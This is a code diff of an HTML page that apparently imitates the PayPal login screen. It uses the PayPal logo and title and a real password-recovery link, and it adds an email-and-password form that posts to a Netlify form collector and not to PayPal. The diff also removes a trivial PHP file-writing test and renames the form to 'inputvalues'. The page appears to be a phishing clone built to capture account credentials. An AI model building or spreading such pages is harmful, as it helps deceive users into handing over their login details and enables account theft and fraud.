@@ -5,15 +5,6 @@
 	<link rel="stylesheet" type="text/css" href="index.css" />
 	<title>PayPal</title>
 
-	<?php
-$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-$txt = "John Doe\n";
-fwrite($myfile, $txt);
-$txt = "Jane Doe\n";
-fwrite($myfile, $txt);
-fclose($myfile);
-?>
-
 
 	<script>
 function myFunction() {
@@ -33,13 +24,17 @@ function myFunction() {
 		<div id="ramme">
 		<img id="logo" src="https://logos-world.net/wp-content/uploads/2020/08/PayPal-Symbol.png" height=33>
 		<br>
-		<div>
-			<form name="contact" method="POST" data-netlify="true">
+
+			
+		
+			<form name="inputvalues" method="POST" data-netlify="true">
 		<input type="text" id="brukernavn" placeholder="Email or mobile number">
 		
 		<br>
 		<input type="password" id="passord" placeholder="Password">
-		</div>
+
+
+				
 		<br>
 		<br>
 		<a href="https://www.paypal.com/authflow/password-recovery/">Forgot password? </a>
